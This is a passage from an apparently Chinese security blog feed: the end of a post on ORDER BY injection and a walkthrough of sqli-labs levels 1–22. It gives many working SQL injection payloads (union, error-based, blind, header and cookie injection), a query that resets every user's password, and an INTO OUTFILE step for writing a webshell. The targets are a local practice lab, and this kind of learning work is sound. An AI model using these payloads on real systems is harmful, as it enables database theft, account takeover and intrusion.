title="反思"></a>反思</h3></li></ol><p><strong>这就是为什么要rand在外面套一层的原因：string转Int啊</strong></p><ul><li>   rand好像这个随机几率影响判断哇，参考前面floor报错反复执行的结果却不同？<blockquote><p>后来less46测试，不会像floor报错那样10次抽奖6次的那种，这里的rand(x)无论执行多少次都是返回一个结果。貌似因为floor那是因为rand在每次访问时同一个语句rand（x）执行两三次导致的，而这里rand每次访问只执行一次。</p><blockquote><p>仅限于int型，不然也会出现rand太随机的问题，可以移步后面的“补充-2”</p></blockquote></blockquote></li><li>   还有其他方法转换吗？看了上篇那篇文章 <code>order by cast(字段 as char)</code>好像也可以？<blockquote><p>不不不，这个cast是强制类型转换的意思，比如你某个字段名就是int类型，比如2，这个时候order by 2就有歧义了，此时就需要这个来转义，使得你以名为2的字段排序，而非第二个字段排序。当然可以as unsigned,as signed都可以。<br>但是这个就是不能达到把最后结果转换为你想要的那个数字的效果，因为你的”2”并非是字段名，他匹配不到，自然无效</p><blockquote><p>看了下其他的<a href="https://www.runoob.com/mysql/mysql-functions.html">mysql函数</a>，也试过不少，除了rand，暂时没有合适的</p></blockquote></blockquote><h3 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h3></li></ul><ol><li>   如上面所分析的，基于bool的 外面套一层rand即可</li><li>   直接报错，因为语句会执行：<code>sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))limit 0,1)</code></li><li>   直接延迟，判断延迟时间即可，根本不用care结果那种：<code>sort=If(ascii(substr(database(),1,1))=115,0,sleep (0.1))</code>这个时候if前面的“1 and if（xxx）”可以要，也可以不要，因为核心就是if语句+sleep语句的执行，而即使前面的1 and搭配，这个if sleep语句一样执行<blockquote><p>基于less47的再次骄傲自大被打脸，我再次认识到了sql语句，如果传递过来的参数比如 <code>id=&#39;$_GET[ID]&#39;</code>此时参数被’’所包围，此时ID里面的参数不会被解析，这个时候就需要搭配<code>1‘and if(xxx)--+</code>来构造引号闭合，从而使得if sleep语句得以执行</p></blockquote><h3 id="补充-2"><a href="#补充-2" class="headerlink" title="补充"></a>补充</h3></li><li>   报错注入遇到的几率低，毕竟都封堵了报错结果的显示。同时基于延迟报错也要注意控制好时间。因为里面有多少列，sleep就要执行多少次，比如这里14个结果集，就睡14*5=70秒时间太长了，可以适当改为0.3s，这样返回就是5.2s</li><li>   rand函数的影响性质再探<img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-06-12 00-22.gif"/><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-06-12 00-24.gif"/>>上面那个图是less47的，下面是less46的：对于less47，反复执行的话，结果就那三样不断地切换（`$sql = "SELECT * FROM users ORDER BY ’$id‘"`）:id外面为一层引号对于less46，反复执行的话，结果始终唯一且不同`$sql = "SELECT * FROM users ORDER BY $id"`>就因为47为了闭合引号，从而mysql执行时候多了一个sort='1' and，就导致结果这样反复>原因暂时不打算深究,目前定结论：int型可以放心rand注入，被单引号包围的string类型不推荐使用。当然string类型也比较少见，比较起不了排序作用，这种代码基本不可能存在>>无论int还是string,保险起见：使用rand时候，记得多次执行先，判断返回值是否具有随机性！先注入rand进行爆破## limit之后的注入，order by的延展篇目还看下select的语法规则![20190611220719.png](https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611220719.png)order by之后可以跟上limit  limit后面可以跟上procedureprocedure后面可以跟上into outfile后面没一个参数都会是一次注入！</li></ol><p>(2)procedure analyse 参数后注入<br>利用 procedure analyse 参数,我们可以执行报错注入。同时,在 procedure analyse 和 order by 之间可以存在 limit 参数,我们在实际应用中,往往也可能会存在 limit 后的注入,可以利用 procedure analyse 进行注入。<br>以下为示范例<br><a href="http://127.0.0.1/sqli-labs/Less-46/?sort=1%20%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1">http://127.0.0.1/sqli-labs/Less-46/?sort=1%20%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1</a>)<br>(3)导入导出文件 into outfile 参数<br><a href="http://127.0.0.1/sqllib/Less-46/?sort=1%20into%20outfile%20%22c:%5C%5Cwamp%5C%5Cwww%5C%5Csqllib%5C%5Ctest1.txt%22">http://127.0.0.1/sqllib/Less-46/?sort=1%20into%20outfile%20%22c:\\wamp\\www\\sqllib\\test1.txt%22</a><br>将查询结果导入到文件当中<br>那这个时候我们可以考虑上传网马,利用 lines terminated by。<br>Into outtfile c:\wamp\www\sqllib\test1.txt lines terminated by 0x(网马进行 16 进制转<br>换)</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>靶场</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs靶场通关记录</title>
    <link href="/2019/06/12/%5Bold%5Dsqli-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2019/06/12/%5Bold%5Dsqli-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>  <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li><li>  修改sql-labs文件夹中sql-connections文件夹下的“db-creds.inc”文件中的账号密码</li><li>  由于他是mysql链接的数据库，而在Php7中被废除了，无法创建数据库。所以切换php5.6的版本即可，或者手动文件中所有的sql改成sqli，具体百度。反正我只是切换了php版本</li><li>  没有输入框，直接在url里面输入参数的那种注入。get参数提交推荐hackbar，post参数提交推荐Burp的repeat模块</li></ul><h1 id="Basic-injection"><a href="#Basic-injection" class="headerlink" title="Basic injection"></a>Basic injection</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><h3 id="lab1之单引号"><a href="#lab1之单引号" class="headerlink" title="lab1之单引号"></a>lab1之单引号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p></blockquote><ul><li>  基于闭合：<code>?id=1%27and &#39;1</code></li><li>  基于注释：<code>?id=1%27--%20</code></li></ul><h3 id="lab2之int型注入"><a href="#lab2之int型注入" class="headerlink" title="lab2之int型注入"></a>lab2之int型注入</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p></blockquote><p>和上面相比，则不需要引号去闭合了</p><ul><li>  <code> ?id=1 and 1</code></li></ul><h3 id="lab3之单引号-括号"><a href="#lab3之单引号-括号" class="headerlink" title="lab3之单引号+括号"></a>lab3之单引号+括号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p></blockquote><p>闭合单引号和括号，再进行注释即可</p><ul><li>  ?id=-1’)union select 1,2,3–%20</li></ul><h3 id="lab4之双引号-括号"><a href="#lab4之双引号-括号" class="headerlink" title="lab4之双引号+括号"></a>lab4之双引号+括号</h3><blockquote><p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></p></blockquote><p>同上闭合双引号和括号即可</p><ul><li>  <code>?id=0&quot;) union select 1,2,3--%20</code></li></ul><p><strong>为什么我输入id=1’ 那么提交的应该是id=”id’”，为什么没有报错?</strong><br>因为””特性表示他是个字符串，而id是个int类型<br>此时再给id赋值是，发生类型转换导致的string to int<br>同理id=1dasda不爆错也基于这个原因<br><img src="https://ws2.sinaimg.cn/large/006MpoZqgy1g3boxedoh1j30fy0dataa.jpg"></p><h3 id="lab5之盲注-单引号-基于联合查询的报错注入"><a href="#lab5之盲注-单引号-基于联合查询的报错注入" class="headerlink" title="lab5之盲注_单引号_基于联合查询的报错注入"></a>lab5之盲注_单引号_基于联合查询的报错注入</h3><p>他给的标题是 double query</p><blockquote><p>Double-Query or Subquery Injection is a technique that is used to exploit an SQL Injection vulnerability. <strong>By combining two queries within a single query</strong>, it is possible to extract information from the database through it’s SQL error messages.</p></blockquote><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; 和上面的lab1区别在于输出</code>echo ‘You are in………..’;`而不输出查询的结果</p></blockquote><p>从题目标题可得知这个要利用union select，又因为不会输出查询结果，外加报错信息没有disable掉，所以适用于<strong>报错注入</strong></p><ul><li><strong>floor</strong>:<code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+</code><ul><li>  记得select database()是个整体，所以需要在外面套上一层括号</li><li>由于floor报错是基于主键重复导致的，而rand()生成是一定程度的随机，因此一次请求可能会显示You are in，多执行请求几次才会爆出来<code>Duplicate entry &#39;*security*1&#39; for key &#39;&#39;</code>如下图<img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-05-31 19-19.gif"/>因此基于floor报错并不稳定</li></ul></li><li><strong>exp</strong>：核心原理就是执行里面的语句，然后是个string，取反之后就是无穷从而导致溢出，溢出的时候爆出信息<ul><li>  我怀疑要么是因为sql mode原因 要么是因为mysqld强制模式 要么因为版本不同，反正我的<code> 5.7.26-0ubuntu0.18.04.1</code>不成功</li><li>  和基于报错的bool盲注搭配起来挺好的</li></ul></li><li><strong>xpath两巨头</strong>：<ul><li>  <code>?id=-1&#39; union select 1,2,(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))--+</code></li><li>  <code>?id=-1&#39; union select 1,2,(select extractvalue(1,concat(0x7e,(select user()))))--+</code></li><li>二者参数个数不同，updata要三个，extract则只需要两个，但是核心都在于第二个参数符合xpath语法的字符串<blockquote><ol><li> 为什么是0x7e<br>0x7e对应～<br>由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</li><li>不要concat，直接updatexml(1,(select database()),1)，或者user会怎么样？<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190531210842.png" alt="20190531210842.png"><br>如果没有concat的话，会导致一定的字符被吃掉，具体原因在一篇文章看过，忘了，貌似与开头的字符有关…反正concat就完事了,后面经过fuzz自己测试之后发现第二个参数的特点<br>①@开头或者数字开头会输出<code>.26-0ubuntu0.18.04.1</code>，即吞掉一部分字符<br>②字母开头 全部字符被吞掉，没有输出<br>③其他的字符开头的字符串则会完整输出<blockquote><p><strong>fuzz的payload</strong>：<code>&quot;?id=-1&#39; union select 1,2,(select updatexml(1,concat(char(%d),(select @@version),char(64)),1))--+&quot;%(i)</code></p></blockquote></li></ol></blockquote></li></ul></li><li><strong>几何六巨头</strong><ul><li> <code>?id = 1&#39; AND **GeometryCollection**((select from (select from(select user())a)b))%23</code></li><li>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()一共六个 替换函数名称即可<blockquote><p>这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为<a href="http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/">5.5.47上可以用来注入，而在5.7.17上则不行</a><br>具体反正我的 5.7.26-0ubuntu0.18.04.1版本不行</p></blockquote></li></ul></li></ul><p>如果报错信息也被disable，则可以看考我的一篇文章： <a href="https://corp0ra1.github.io/2019/05/22/%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/#%E5%8A%A0%E9%A4%90">sql之基于报错的注入</a></p><h3 id="lab6之盲注-双引号-基于联合查询的报错注入"><a href="#lab6之盲注-双引号-基于联合查询的报错注入" class="headerlink" title="lab6之盲注_双引号_基于联合查询的报错注入"></a>lab6之盲注_双引号_基于联合查询的报错注入</h3><blockquote><p><code>$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code><br>同lab5也是<code>echo &#39;You are in...........&#39;;</code>而不直接输出结果</p></blockquote><p>具体打法同上，只是闭合掉双引号即可</p><ul><li>  <code>?id=1&quot; and &quot;1</code></li></ul><h3 id="lab7之盲注-dump-into-outfile"><a href="#lab7之盲注-dump-into-outfile" class="headerlink" title="lab7之盲注_dump into outfile"></a>lab7之盲注_dump into outfile</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code><br>同lab5也是<code>echo &#39;You are in...........&#39;;</code>而不直接输出结果</p></blockquote><p>安全模块导致无法复现，具体打法可以参考百度<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190530155535.png" alt="20190530155535.png"></p><h3 id="lab8之盲注-直接构造布尔-单引号"><a href="#lab8之盲注-直接构造布尔-单引号" class="headerlink" title="lab8之盲注_直接构造布尔+单引号"></a>lab8之盲注_直接构造布尔+单引号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>同lab5也是<code>echo &#39;You are in...........&#39;;</code>而不直接输出结果<br>但是注释掉了报错信息</p><blockquote><p><code>    //print_r(mysql_error());</code><br><code>    //echo &quot;You have an error in your SQL syntax&quot;;</code></p></blockquote></blockquote><p>闭合单引号的同时，构造bool表达式</p><ul><li> <code>?id=1&#39; and length(database())=8%23</code>     BTW：chr(%23)===#</li></ul><h3 id="lab9之盲注-基于时间的布尔-单引号"><a href="#lab9之盲注-基于时间的布尔-单引号" class="headerlink" title="lab9之盲注_基于时间的布尔+单引号"></a>lab9之盲注_基于时间的布尔+单引号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>同lab5也是<code>echo &#39;You are in...........&#39;;</code>而不直接输出结果<br>同lab7注释掉了报错信息</p></blockquote><p>闭合单引号的同时，构造基于时间延迟的bool表达式</p><ul><li>  <code>?id=1&#39; and If(ascii(substr(database(),1,1))=115,1,sleep(5))--%20</code> <h3 id="lab10之盲注-基于时间的布尔-双引号"><a href="#lab10之盲注-基于时间的布尔-双引号" class="headerlink" title="lab10之盲注_基于时间的布尔+双引号"></a>lab10之盲注_基于时间的布尔+双引号</h3><blockquote><p><code>$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code><br>其他同lab9</p></blockquote></li></ul><p>闭合双引号即可，其他同lab9</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))<br><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<br><span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190602002329.png" alt="20190602002329.png"></p><blockquote><p>基于post构造payload参数的时候 记得如果在页面填空框里面填写数据，则直接#或者–空格，而不是用%23或者–+的形式，因为数据传输的时候会变编码，比如填空框填写的%23，客户端传递到服务器端的html包里面的body部分 %23会被编码为%2523，进而被服务器解析之后为%23，而非#，从而导致注入失败<br>而get请求，传递%23就是%23，被服务器解析之后为#<br>注意Python脚本中是第一种情况，必须使用#，而非%23，但是在hackbar里面的body还是可以使用–+，burp就已经是body包里面的内容了，是%23就是%23，不用改</p></blockquote><h3 id="lab11之单引号"><a href="#lab11之单引号" class="headerlink" title="lab11之单引号"></a>lab11之单引号</h3><blockquote><p><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code></p></blockquote><ul><li><p>探测：admin’or ‘1’=’1#</p><ul><li>  此时的#则不需要%23，因为参数传递的方式post</li></ul></li><li><p>  联合查询：<code>passwd=admin&amp;uname=-1&#39; union select 1,(select schema_name from information_schema.schemata limit 0,1)--+</code></p></li><li><p>  基于报错：<code>passwd=admin&amp;uname=-1&#39;  union select 1,2,(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))--+</code></p><h3 id="lab12之双引号-括号"><a href="#lab12之双引号-括号" class="headerlink" title="lab12之双引号+括号"></a>lab12之双引号+括号</h3><blockquote><p><code>$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;</code><br><code>$passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; </code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</code></p></blockquote></li><li><p>  双引号闭合+括号闭合即可，其他同上<br><code>passwd=admin&amp;uname=-1&quot;)  union select 1,(select version())--+</code></p><h3 id="lab13之盲注-单引号-括号-基于联合查询的报错注入"><a href="#lab13之盲注-单引号-括号-基于联合查询的报错注入" class="headerlink" title="lab13之盲注_单引号+括号_基于联合查询的报错注入"></a>lab13之盲注_单引号+括号_基于联合查询的报错注入</h3><blockquote><p><code>@$sql=&quot;SELECT username, password FROM users WHERE username=(&#39;$uname&#39;) and password=(&#39;$passwd&#39;) LIMIT 0,1&quot;;</code><br><code>print_r(mysql_error());</code><br>单引号，括号的绕过先<br>同时采用了@来抑制报错信息，并且注释掉了直接输出的结果</p><blockquote><p><code>//echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];</code><br><code>//echo &#39;Your Password:&#39; .$row[&#39;password&#39;];</code></p></blockquote></blockquote></li></ul><p>程序设计存在逻辑漏洞，即虽然抑制了sql语句的报错信息，但是报错之后fetch row中的row为空，还是回去执行print error。所以本质上没有能够抑制住报错注入</p><ul><li>  <code>passwd=admin&amp;uname=a%27%29++union+select+1,2,(select+updatexml(1,concat(0x7e,(select+@@version),0x7e),1))--+</code><h3 id="lab14之盲注-双引号-基于联合查询的报错注入"><a href="#lab14之盲注-双引号-基于联合查询的报错注入" class="headerlink" title="lab14之盲注_双引号_基于联合查询的报错注入"></a>lab14之盲注_双引号_基于联合查询的报错注入</h3></li></ul><blockquote><p><code>$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;</code><br><code>$passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; </code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;</code><br>其他同lab13</p></blockquote><p>改成双引号闭合即可</p><ul><li>  <code>passwd=admin&amp;uname=a&quot;++union+select+1,2,(select+updatexml(1,concat(0x7e,(select+@@version),0x7e),1))--+</code></li></ul><h3 id="lab15之盲注-布尔-时间-单引号"><a href="#lab15之盲注-布尔-时间-单引号" class="headerlink" title="lab15之盲注_布尔/时间+单引号"></a>lab15之盲注_布尔/时间+单引号</h3><blockquote><p><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code><br>和lab13 14区别在于注释掉了<code>print_r(mysql_error());</code>因此就是彻底的盲注了</p></blockquote><ul><li>  基于布尔：<code>admin&#39; and ord(mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=%d #</code></li><li>  基于布尔+报错：<code>admin&#39; and IF(ord(mid((select password from users limit %d,1),%d,1))=%d,1,exp(710)) #</code></li><li>  基于布尔+时间：<code>admin&#39; and IF(ord(mid((select password from users limit %d,1),%d,1))=%d,sleep(4),1) #</code><h3 id="lab16之盲注-布尔-时间-双引号-括号"><a href="#lab16之盲注-布尔-时间-双引号-括号" class="headerlink" title="lab16之盲注_布尔/时间+双引号+括号"></a>lab16之盲注_布尔/时间+双引号+括号</h3><blockquote><p><code>$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;</code><br><code>$passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; </code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</code></p></blockquote></li></ul><p>基于和上面lab15相同，只是个双引号和括号的问题</p><ul><li><p>  passwd=a&amp;uname=admin”) and  length(database())=8#</p><h2 id="updata-query"><a href="#updata-query" class="headerlink" title="updata query"></a>updata query</h2><p>所谓的updata query 是因为他是个更新密码的界面<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190602002156.png" alt="20190602002156.png"></p><h3 id="lab17之updata-query"><a href="#lab17之updata-query" class="headerlink" title="lab17之updata query"></a>lab17之updata query</h3><blockquote><p><code>$uname=check_input($_POST[&#39;uname&#39;]);</code><br><code>$passwd=$_POST[&#39;passwd&#39;];</code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$row1 = $row[&#39;username&#39;]; </code><br><code>$update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;</code><br><code>print_r(mysql_error());</code><br>只有username被check_input函数过滤，而password没被过滤，因此可以从password开始<br>所庆幸的是她没有注释掉报错，因此可以从报错入手</p><blockquote><p>check_input函数：首先对值进行一个截断：防止过长的非法注入语句，其次get_magic_quotes_gpc()对特殊字符转义，再者检测字符串中的字符是否都是数字，如果非数字则用双引号包含，最后mysql_real_escape_string再进行一次转义处理。因此基本上从uname这一块入手基本上不可能</p></blockquote></blockquote></li><li><p>  基于报错：<code>uname=admin&amp;passwd=11&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code></p></li><li><p>  基于延时：<code>uname=admin&amp;passwd=11&#39;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#</code></p></li><li><p>修改所有人的密码为1：提交参数<code>uname=xxx&amp;passwd=1&#39; and 1#</code>===&gt;构造语句<code>UPDATE users SET password = &#39;1&#39; and 1#&#39; WHERE username=&#39;test&#39;</code>====&gt;执行语句<code>UPDATE users SET password = &#39;1&#39;and 1</code></p><ol><li><p><code>set passwd=&#39;1&#39;and 1</code>这个是什么鬼语法？<br>先执行and的布尔逻辑运算，因此 passwd=1，即语句最终等效于<code>UPDATE users SET password = 1</code></p></li><li><p>这里是更改所以人的密码，而且总感觉有点怪，set+and，什么鬼啊<br>可参考这两篇文章<a href="https://blog.csdn.net/jiang297/article/details/82802735">传送门①</a><a href="https://blog.csdn.net/liu510817387/article/details/52639058">传送门②</a></p></li><li><pre><code>如果想更新多个字段的值，应该是set a=&quot;xx1&quot;,b=&quot;xx2&quot;，a和b间隔应该是逗号，如果间隔是and，则只要and后面非0，就会视为1，进行xxx and 1的逻辑判断</code></pre></li></ol></li></ul><p><strong>为什么前面的关卡不基于passwd注入？</strong><br>①注意到这里的语句结构是<code>UPDATE users SET password = &#39;xxx&#39; WHERE username=&#39;xxx&#39;</code>，password在sql语句前面，而之前的是<code>$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39;</code><br>②前面uname已经可以注入，肯定优先前者，再考虑后者啊。<br>③本质上都是一样的，其实是没有分别，都是基于语句的提前闭合截断，去执行自己的注入语句。只是前者更方便，而且uname在前面也方便注释掉passwd，从而注释的内容更多一点，而在passwd这里注入可能还得必须保证uname这里的正确性，不然and短路的问题，会导致后面的password语句无法执行。所以使用前者更多</p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><h3 id="lab18之header-uagent"><a href="#lab18之header-uagent" class="headerlink" title="lab18之header uagent"></a>lab18之header uagent</h3><blockquote><p><code>$uname = check_input($_POST[&#39;uname&#39;]);</code><br><code>$passwd = check_input($_POST[&#39;passwd&#39;]);</code>//uname和passwd都进行了过滤，故不存在注入点<br><code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code><br><code>$IP = $_SERVER[&#39;REMOTE_ADDR&#39;];</code><br><code>$insert=&quot;INSERT INTO ‘security&#39;.&#39;uagents&#39; (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;,&#39;$IP&#39;, $uname)&quot;;</code>//ip不方便修改，uname也不存在注入点，只能useragent入手</p></blockquote><ul><li>因为没有注入掉这个语句：<code>print_r(mysql_error());</code>所以基于报错肯定首选<ol><li> 将 user-agent 修改为<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></li><li> 此时在数据库中执行的是这个语句：<code>INSERT INTO </code>security<code>.</code>uagents<code> (</code>uagent<code>, </code>ip_address<code>, </code>username<code>) VALUES (&#39;&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1&#39;, &#39;127.0.0.1&#39;, &#39;admin&#39;)</code></li><li> 插入数据的时候会执行这个语句<code>concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1&#39;</code></li><li>进而报错显示出数据库的版本。当然这条信息也没有插入进去！</li></ol></li><li>  同时也可以考虑基于时间注入，将 user-agent 修改为：<code>12&#39;and If(ascii(substr(database(),1,1))=114,1,sleep(5)) and &#39;1&#39;=&#39;1</code></li><li>无法直接提取出有效数据，比如无法<code>select user()</code>这样把user()直接写入agent然后输出，因为有个‘’包围，所以你必须闭合他们，你一闭合然后利用and进行逻辑运算，那么结果要么0要么1，也就无法提取了<ul><li>  但是注意到还有一句<code>echo &#39;Your User Agent is: &#39; .$uagent;</code>：会返回你的agent结果的0与1，那么可以构造布尔盲注，看返回的结果是0还是1，进而可以构造出一个<strong>bool盲注</strong>出来来</li></ul></li></ul><p>可以考虑存储形式XSS，毕竟他还要<code>echo &#39;Your User Agent is: &#39; .$uagent;</code></p><h3 id="lab19之Header-referer"><a href="#lab19之Header-referer" class="headerlink" title="lab19之Header referer"></a>lab19之Header referer</h3><blockquote><p><code>$uagent = $_SERVER[&#39;HTTP_REFERER&#39;];</code><br><code>$insert=&quot;INSERT INTO &#39;security&#39;.&#39;referers&#39; (&#39;referer&#39;, &#39;ip_address&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;</code><br><code>print_r(mysql_error());</code><br><code>echo &#39;Your User Agent is: &#39; .$uagent;</code><br>其他和lab18一样，只是uagent取值不同，这里取得是http_referer</p></blockquote><p>payload同lab18 只是位置不同而已！这次更改的位置在referer的位置</p><h3 id="lab20之cookie-单引号"><a href="#lab20之cookie-单引号" class="headerlink" title="lab20之cookie+单引号"></a>lab20之cookie+单引号</h3><blockquote><p>这道题不能纯贴代码，只能说他的过程</p><ol><li>  先判断<code>if(!isset($_COOKIE[&#39;uname&#39;]))</code></li><li>  没有的话就设置cookie：<code>setcookie(&#39;uname&#39;, $row1[&#39;username&#39;]， time()+3600);</code>而<code>uname=$row1[&#39;username&#39;];</code>而row1=<code> $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</code>，这个里面的unmae和passwd都被过滤了，所以这里不存在过滤。设置完cookie之后重定向到<code>header (&#39;Location: index.php&#39;);</code></li><li>  此时有了cookie，此时在判断cookie：有的话，在判断<code>if(!isset($_POST[&#39;submit&#39;]))</code>，因为要是重定向的话就没有这个参数，如果有的话，就<code>echo &quot; Your Cookie is deleted&quot;;</code>然后重置cookie再重定向<code>header (&#39;Location: index.php&#39;);</code></li><li>  <strong>上面的每一步只是为了进入这一步</strong>：<code> $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;</code>这里对cookee参数没有过滤，也就可以在重定向的这个界面修改cookie实现注入</li></ol></blockquote><p>看到这个sql语句，就是最简单的lab1的题，注入方法相同，注入点不同而已</p><ul><li>  <code>die(&#39;Issue with your mysql: &#39; . mysql_error());</code> 所以可以基于报错<code>Cookie: uname=&#39;and updatexml(1,concat(0x7e,(select user()),0x7e),1)#</code></li><li>  <code>echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];echo &#39;Your Password:&#39; .$row[&#39;password&#39;]echo &#39;Your ID:&#39; .$row[&#39;id&#39;];;</code>可以联合注入：<code>Cookie: uname=&#39;union select 1,2,user()#</code></li><li>  当然最基础的布尔肯定可以啦：<code>Cookie: uname=admin&#39;and length(database())=8#</code></li><li>  当然存在越权漏洞：<code>Cookie: uname=Dumb</code>可以访问任意一个用户的信息</li></ul><h3 id="less21之cookie-base64-单引号-括号"><a href="#less21之cookie-base64-单引号-括号" class="headerlink" title="less21之cookie+base64+单引号+括号"></a>less21之cookie+base64+单引号+括号</h3><blockquote><p>和less20的区别在于<br><code>setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()+3600);</code><br><code>$cookee = base64_decode($cookee);</code><br><code>$sql=&quot;SELECT * FROM users WHERE username=(&#39;$cookee&#39;) LIMIT 0,1&quot;;</code><br>即采取了base64加密以及单引号括号</p></blockquote><ul><li><p>less20的payload单引号之后加上‘）’然后base64加密即可<br>  eg:”<code>&#39;)union select 1,2,user()#</code>–base64–&gt;<code>Jyl1bmlvbiBzZWxlY3QgMSwyLHVzZXIoKSM=</code></p><h3 id="less22之cookie-base64-双引号"><a href="#less22之cookie-base64-双引号" class="headerlink" 